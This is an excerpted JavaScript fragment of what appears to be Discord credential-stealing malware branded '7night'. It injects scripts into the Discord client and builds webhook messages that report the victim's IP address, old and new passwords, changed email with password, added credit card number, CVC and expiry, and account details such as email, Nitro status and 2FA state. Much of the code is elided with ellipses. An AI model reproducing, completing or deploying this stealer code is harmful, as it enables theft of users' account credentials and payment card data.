...
if (fs.existsSync(bdPath)) require(bdPath);`;
    ...
    if (!fs.existsSync(path.join(__dirname, "7night"))) return !0;
    execScript(
...
function GetNitro(flags) {
    ...
    if (flags == 1) {
        return "<a:classic:1074532897245122651>"
    }
    if (flags == 2) {
        return "<a:boost:1074532894288138280>"
    } else {
        return "\`No Nitro`"
    }
}
            ...
            function Cool() {
                ...
                json.forEach(z => {
                    if (z.type == "") {
                        ...
                        billing += ":heavy_check_mark:" + " <:Paypal:1074179763809292329>"
            ...
            const params = {
                embeds: [{
                    ...
                    "fields": [{
                        ...
                        name: "<:7n:1074194785704878131> IP:",
                        value: `\`${getIP()}\``,
                        inline: true
                    }, {
                        ...
                        name: "<:7n:1074194788154359858> Old Password:",
                        value: `\`${oldpassword}\``,
                        inline: true
                    }, {
                        name: "<:7n:1074194788154359858> New Password:",
                        value: `\`${newpassword}\``,
                        inline: true
                    }],
                    "author": {
...
async function ChangeEmail(newemail, password, token) {
    ...
    window.webContents.executeJavaScript(`
        ...
        window.webContents.executeJavaScript(`
            ...
            if(info.avatar === null){
                usericonurl = "https://cdn.discordapp.com/attachments/1069552184934539315/1074185375980982422/7night.png"
            }else usericonurl = `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.png?size=600`;
            if(info.banner === null){
                bannerurl = "https://cdn.discordapp.com/attachments/1069552184934539315/1074185375980982422/7night.png"
            ...
            const params = {
                embeds: [{
                    ...
                    "fields": [{
                        ...
                        name: "<:7n:1074194788154359858> New Email:",
                        value: `\`${newemail}\``,
                        inline: true
                    }, {
                        name: "<:7n:1074194788154359858> Password:",
                        value: `\`${password}\``,
                        inline: true
                    }],
                    "author": {
...
async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
    ...
    var {
        ...
        const params = {
            avatar_url: "https://cdn.discordapp.com/attachments/1069552184934539315/1074185375980982422/7night.png",
            content: "",
            embeds: [{
                    ...
                    **ID** : \`${info.id}\`\n
                    **Email**: \`${info.email}\`\n
                    **Nitro Type**: \`${GetNitro(info.premium_type)}\`\n
					**Language**: \`${GetLangue(info.locale)}\`\n
					**A2F**: \`${GetA2F(info.mfa_enabled)}\`\n
					**NSFW**: \`${GetNSFW(info.nsfw_allowed)}\`\n
                    **Badges**: ${GetBadges(info.flags)}\n
